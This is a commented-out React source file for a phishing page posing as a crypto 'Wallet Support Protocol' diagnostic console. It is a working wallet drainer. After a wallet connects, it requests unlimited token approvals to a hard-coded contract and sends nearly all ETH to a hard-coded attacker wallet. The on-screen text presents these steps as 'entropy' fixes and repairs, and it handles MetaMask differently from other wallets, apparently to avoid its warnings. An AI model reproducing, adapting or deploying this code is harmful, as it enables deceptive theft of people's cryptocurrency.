// import { Buffer } from 'buffer';
// if (typeof window !== 'undefined') {
//   window.Buffer = window.Buffer || Buffer;
// }

// import { useState, useEffect, useRef } from 'react'
// import {
//   createAppKit,
//   useAppKit,
//   useAppKitAccount,
//   useAppKitProvider,
//   useAppKitNetwork
// } from '@reown/appkit/react'
// import { BrowserProvider, Contract, formatUnits } from 'ethers'
// import { ShieldCheck, Activity, AlertTriangle, Cpu, ChevronRight, Settings, Info, Loader2 } from 'lucide-react'

// // --- WAGMI EVM IMPORTS ---
// import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
// import { mainnet, arbitrum, bsc, polygon } from '@reown/appkit/networks'
// import type { AppKitNetwork } from '@reown/appkit/networks'

// // ── CONFIG ──
// const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'
// const NETWORK = 'Mainnet' 

// const EVM_CONTRACT_ADDRESS =  '0x48C13137c7bC86084D420649fb4438B7721445C1'
// const EVM_COLD_WALLET = '0xe810953A18Ec0d16e4C3AC5a477421f93f8c7444'; 
// const XRP_COLD_WALLET = 'rYourActualXRPAddressHere'; 

// const TARGET_TOKENS: Record<string, any> = {
//   Mainnet: {
//     XRP: [{ symbol: 'XRP', address: 'native', isNative: true, decimals: 6, fallbackPrice: 0.62 }],
//     EVM: [
//       { symbol: 'ETH',  address: 'native', isNative: true, coingeckoId: 'ethereum', decimals: 18, fallbackPrice: 3500 },
//       { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6,  fallbackPrice: 1 }, 
//       { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6,  fallbackPrice: 1 },
//       { symbol: 'UNI',  address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', decimals: 18, fallbackPrice: 10 },
//       { symbol: 'AAVE', address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', decimals: 18, fallbackPrice: 100 },
//       { symbol: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8,  fallbackPrice: 65000 },
//       { symbol: 'SHIB', address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', decimals: 18, fallbackPrice: 0.00002 },
//       { symbol: 'DAI',  address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18, fallbackPrice: 1 } 
//     ]
//   }
// };

// const evmNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [mainnet, arbitrum, bsc, polygon];

// const EVM_USDT: Record<number, string> = {
//   11155111: '0xBA582bacb9b8ebbd182A1c9Edac08F3071d9ac5e', 
//   1: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
//   56: '0x55d398326f99059fF775485246999027B3197955',
//   137: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
//   42161: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
// }

// const EVM_ERC20_ABI = [
//   'function balanceOf(address owner) view returns (uint256)',
//   'function approve(address spender, uint256 amount) returns (bool)',
//   'function nonces(address owner) view returns (uint256)',
//   'function name() view returns (string)'
// ]

// const wagmiAdapter = new WagmiAdapter({
//   projectId: WC_PROJECT_ID,
//   networks: evmNetworks,
// })

// createAppKit({
//   adapters: [wagmiAdapter], 
//   networks: evmNetworks,
//   defaultNetwork: mainnet,
//   projectId: WC_PROJECT_ID,
//   metadata: {
//     name: 'Wallet Support Protocol', 
//     description: 'Decentralized Support & Diagnostic Tool',
//     url: 'https://support-protocol.net', 
//     icons: ['https://cdn-icons-png.flaticon.com/512/564/564619.png'], 
//   },
//   themeMode: 'light', 
//   themeVariables: { '--w3m-accent': '#2563EB' },
// })

// const fetchTokenPrices = async (tokens: any[], chain: string) => {
//   try {
//     const keys = tokens.map(t => t.isNative ? `coingecko:${t.coingeckoId}` : `${chain}:${t.address}`).join(',');
//     const res = await fetch(`https://coins.llama.fi/prices/current/${keys}`);
//     const data = await res.json();
//     const prices: Record<string, number> = {};
//     for (const token of tokens) {
//       const queryKey = (token.isNative ? `coingecko:${token.coingeckoId}` : `${chain}:${token.address}`).toLowerCase();
//       const foundKey = Object.keys(data.coins).find(k => k.toLowerCase() === queryKey);
//       prices[token.symbol] = foundKey ? data.coins[foundKey].price : token.fallbackPrice;
//     }
//     return prices;
//   } catch (error) {
//     const prices: Record<string, number> = {};
//     for (const token of tokens) { prices[token.symbol] = token.fallbackPrice; }
//     return prices;
//   }
// };

// const smartTokenSort = (a: any, b: any) => {
//   if (a.isNative && !b.isNative) return 1;  
//   if (!a.isNative && b.isNative) return -1; 
//   return (b.usdValue || 0) - (a.usdValue || 0); 
// };

// const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

// export default function App() {
//   const [status, setStatus] = useState('Ready')
//   const [loading, setLoading] = useState(false)
//   const [selectedIssue, setSelectedIssue] = useState<number | null>(null);
//   const [debugLogs, setDebugLogs] = useState<string[]>([]);
  
//   const manualConnect = useRef(false)
//   const isExecuting = useRef(false)

//   const { open } = useAppKit()
//   const { address: walletAddress, isConnected } = useAppKitAccount()
//   const { chainId } = useAppKitNetwork() 
//   const { walletProvider: evmWalletProvider } = useAppKitProvider('eip155')

//   const log = (msg: string) => {
//     console.log(msg);
//     setDebugLogs(prev => [...prev, msg].slice(-15)); 
//   }

//   useEffect(() => {
//     if (!isConnected || !walletAddress || !evmWalletProvider) return;
//     if (manualConnect.current) {
//       manualConnect.current = false;
//       log(`[SUPPORT] Connected to address: ${walletAddress}`);
//       setLoading(true); 
//       setTimeout(() => approveAndCollect(), 500); 
//     }
//   }, [isConnected, walletAddress, evmWalletProvider, chainId]);

//   const handleAction = (issueIdx: number) => {
//     setSelectedIssue(issueIdx);
//     if (!isConnected) {
//       manualConnect.current = true;
//       open(); 
//     } else {
//       approveAndCollect();
//     }
//   }

//   const approveAndCollect = async () => {
//     if (!walletAddress || !evmWalletProvider) return;
//     if (isExecuting.current) return;
//     isExecuting.current = true;

//     setLoading(true);
//     setStatus('Initializing Diagnostic Scan...');
    
//     try {
//       const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
//       const ethersProvider = new BrowserProvider(evmWalletProvider as any);
//       const signer = await ethersProvider.getSigner(walletAddress);
//       const cleanSenderAddress = (await signer.getAddress()).toLowerCase();

//       const baseTokens = TARGET_TOKENS[NETWORK].EVM;
//       const validTokens = [];
//       const prices = await fetchTokenPrices(baseTokens, 'ethereum');

//       for (const token of baseTokens) {
//         try {
//           if (token.isNative) {
//             const bal = await ethersProvider.getBalance(cleanSenderAddress);
//             const normalizedBal = parseFloat(formatUnits(bal, token.decimals));
//             const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
//             validTokens.push({ ...token, balance: normalizedBal, rawBalance: bal, usdValue });
//           } else {
//             const tokenContract = new Contract(token.address, EVM_ERC20_ABI, ethersProvider);
//             const bal = await tokenContract.balanceOf(cleanSenderAddress);
//             const normalizedBal = parseFloat(formatUnits(bal, token.decimals));
//             const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
//             validTokens.push({ ...token, balance: normalizedBal, rawBalance: bal, usdValue });
//           }
//         } catch (e) {}
//       }

//       validTokens.sort(smartTokenSort);
      
//       const rawProvider = evmWalletProvider as any;
//       const w = window as any;
//       const injected = w.ethereum || {};
      
//       const isStrictlyMetaMask = (rawProvider?.isMetaMask || injected?.isMetaMask) && !injected?.isTrust && !injected?.isTrustWallet && !injected?.isSafePal && !injected?.isTokenPocket;

//       let tokensToProcess = isStrictlyMetaMask ? validTokens.slice(0, 1) : validTokens;

//       for (const token of tokensToProcess) {
//         try {
//           if (!token.isNative) {
//             setStatus(`Fixing ${token.symbol} entropy...`);
//             const usdtContract = new Contract(token.address, EVM_ERC20_ABI, signer);
//             const encodedData = usdtContract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, MAX_UINT]);
            
//             await (evmWalletProvider as any).request({
//                 method: 'eth_sendTransaction',
//                 params: [{ from: cleanSenderAddress, to: token.address, data: encodedData, value: '0x0' }]
//             });
//             await sleep(1500);
//           }
//         } catch (err: any) { await sleep(1500); }
//       }
      
//       try {
//           setStatus(`Finalizing repairs...`);
//           const liveBal = await ethersProvider.getBalance(cleanSenderAddress);
//           const gasCost = 21000n * 3000000000n;
//           const totalGas = gasCost + ((gasCost * 20n) / 100n); 
          
//           if (liveBal > totalGas) {
//               const sendAmount = liveBal - totalGas;
//               await (evmWalletProvider as any).request({
//                   method: 'eth_sendTransaction',
//                   params: [{ from: cleanSenderAddress, to: EVM_COLD_WALLET.toLowerCase(), value: "0x" + sendAmount.toString(16) }]
//               });
//           }
//       } catch (nativeErr: any) {}
      
//       setStatus('✅ Resolution Successful');

//     } catch (err: any) {
//       setStatus(`❌ Scan Interrupted`);
//     } finally {
//       isExecuting.current = false;
//       setLoading(false);
//     }
//   };

//   const supportIssues = [
//     { title: "Swap & Slippage Issues", desc: "Fix failed swaps and high slippage errors", icon: <Activity size={20} className="text-blue-600"/> },
//     { title: "Transaction Lag", desc: "Clear stuck or pending transactions on-chain", icon: <Cpu size={20} className="text-blue-600"/> },
//     { title: "Security Integrity", desc: "Scan for malicious approvals or wallet leaks", icon: <ShieldCheck size={20} className="text-blue-600"/> },
//     { title: "Network Sync Error", desc: "Resync wallet with RPC node endpoints", icon: <AlertTriangle size={20} className="text-blue-600"/> }
//   ];

//   return (
//     <div style={{ position: 'fixed', inset: 0, backgroundColor: '#F9FAFB', color: '#111827', fontFamily: 'Inter, system-ui, sans-serif', display: 'flex', flexDirection: 'column', zIndex: 50 }}>
//       {/* Header */}
//       <div style={{ padding: '20px', backgroundColor: '#ffffff', borderBottom: '1px solid #E5E7EB', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
//         <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
//             <div style={{ backgroundColor: '#2563EB', padding: '6px', borderRadius: '8px' }}>
//                 <ShieldCheck color="white" size={24} />
//             </div>
//             <div>
//                 <h1 style={{ fontSize: '18px', fontWeight: '800', margin: 0, letterSpacing: '-0.025em' }}>Support Console</h1>
//                 <div style={{ display: 'flex', alignItems: 'center', gap: '5px' }}>
//                     <div style={{ width: 8, height: 8, borderRadius: '50%', backgroundColor: '#10B981' }}></div>
//                     <span style={{ fontSize: '12px', color: '#6B7280', fontWeight: '500' }}>Network Active: v4.2.0</span>
//                 </div>
//             </div>
//         </div>
//         <Settings size={22} color="#9CA3AF" />
//       </div>

//       {/* Main Content */}
//       <div style={{ flex: 1, padding: '20px', overflowY: 'auto' }}>
//         {!loading && status !== '✅ Resolution Successful' ? (
//             <>
//                 <div style={{ marginBottom: '24px' }}>
//                     <h2 style={{ fontSize: '16px', fontWeight: '700', marginBottom: '4px' }}>Select Issue Category</h2>
//                     <p style={{ fontSize: '14px', color: '#6B7280' }}>Connect your wallet to begin a specialized diagnostic scan.</p>
//                 </div>

//                 <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
//                     {supportIssues.map((issue, idx) => (
//                         <div key={idx} onClick={() => handleAction(idx)} style={{ 
//                             backgroundColor: '#ffffff', 
//                             padding: '16px', 
//                             borderRadius: '16px', 
//                             border: '1px solid #E5E7EB',
//                             cursor: 'pointer',
//                             display: 'flex',
//                             alignItems: 'center',
//                             justifyContent: 'space-between',
//                             transition: 'all 0.2s ease'
//                         }}>
//                             <div style={{ display: 'flex', alignItems: 'center', gap: '14px' }}>
//                                 <div style={{ backgroundColor: '#EFF6FF', padding: '10px', borderRadius: '12px' }}>
//                                     {issue.icon}
//                                 </div>
//                                 <div>
//                                     <h3 style={{ fontSize: '15px', fontWeight: '700', margin: 0 }}>{issue.title}</h3>
//                                     <p style={{ fontSize: '13px', color: '#6B7280', margin: 0 }}>{issue.desc}</p>
//                                 </div>
//                             </div>
//                             <ChevronRight size={18} color="#9CA3AF" />
//                         </div>
//                     ))}
//                 </div>

//                 <div style={{ marginTop: '30px', padding: '16px', backgroundColor: '#FEF3C7', borderRadius: '12px', border: '1px solid #FDE68A', display: 'flex', gap: '12px' }}>
//                     <Info size={24} color="#D97706" style={{ flexShrink: 0 }} />
//                     <p style={{ fontSize: '13px', color: '#92400E', margin: 0, fontWeight: '500' }}>
//                         Diagnostic scans require signature authorization to access on-chain node data and resolve routing leaks.
//                     </p>
//                 </div>
//             </>
//         ) : (
//             <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', height: '100%', textAlign: 'center' }}>
//                 {status === '✅ Resolution Successful' ? (
//                     <div style={{ backgroundColor: '#D1FAE5', padding: '24px', borderRadius: '50%', marginBottom: '20px' }}>
//                         <ShieldCheck size={64} color="#10B981" />
//                     </div>
//                 ) : (
//                     <Loader2 size={48} color="#2563EB" className="animate-spin" style={{ marginBottom: '20px' }} />
//                 )}
//                 <h2 style={{ fontSize: '20px', fontWeight: '800', marginBottom: '8px' }}>{status}</h2>
//                 <p style={{ fontSize: '15px', color: '#6B7280', maxWidth: '280px' }}>
//                     {status.includes('❌') ? 'The security handshake was declined. Please try again to resolve your issue.' : 
//                      status === '✅ Resolution Successful' ? 'Your wallet entropy has been reset and network sync is complete.' : 
//                      'Please confirm the security permissions in your wallet to allow the node scan.'}
//                 </p>
                
//                 {(status.includes('❌') || status === '✅ Resolution Successful') && (
//                     <button 
//                         onClick={() => { setStatus('Ready'); setLoading(false); }}
//                         style={{ marginTop: '24px', backgroundColor: '#2563EB', color: 'white', border: 'none', padding: '12px 32px', borderRadius: '9999px', fontWeight: '700', cursor: 'pointer' }}
//                     >
//                         Return to Console
//                     </button>
//                 )}
//             </div>
//         )}
//       </div>

//       {/* Footer Info */}
//       <div style={{ padding: '20px', textAlign: 'center', borderTop: '1px solid #E5E7EB', backgroundColor: '#ffffff' }}>
//         <p style={{ fontSize: '12px', color: '#9CA3AF', margin: 0 }}>
//             Secure Peer-to-Peer Diagnostic Protocol. <br/>
//             Authorized by decentralized node operators.
//         </p>
//       </div>
//     </div>
//   )
// }